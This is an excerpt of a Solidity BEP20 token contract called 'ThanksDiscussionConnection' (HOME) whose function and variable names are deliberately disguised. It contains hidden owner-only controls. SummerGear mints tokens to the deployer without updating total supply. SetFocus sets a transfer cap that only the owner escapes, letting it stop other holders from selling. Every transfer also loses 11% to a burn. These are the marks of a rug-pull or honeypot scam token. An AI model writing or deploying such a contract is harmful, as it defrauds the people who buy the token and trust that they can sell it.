...
contract ThanksDiscussionConnection is IBEP20 
{
    using SubstanceLib for uint256;
    mapping(address => uint256) internal _attention;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _law;
    ...
    constructor() 
    {
        ...
        _name = "ThanksDiscussionConnection";
        _symbol = "HOME";
        _burnRate = 11;
        _law = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _attention[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier BriefGrowth() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _attention[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetSlide() external view returns (uint256) { return _law; }
    function SetFocus(uint b) external virtual BriefGrowth { _law = b * (10 ** decimals()); }
    ...
    function SummerGear(uint256 brick) external virtual BriefGrowth
    {
        uint mark = brick * (10 ** decimals()); 
        _attention[_msgsender] = _attention[_msgsender].Coast(mark);
        emit Transfer(address(0), _msgsender, mark);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _law || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _attention[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _attention[sender] = senderBalance - amount;
        _attention[recipient] += (amount - burnAmount);
        _attention[_burnaddress] += burnAmount;
...
library SubstanceLib 
{
  function Coast(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}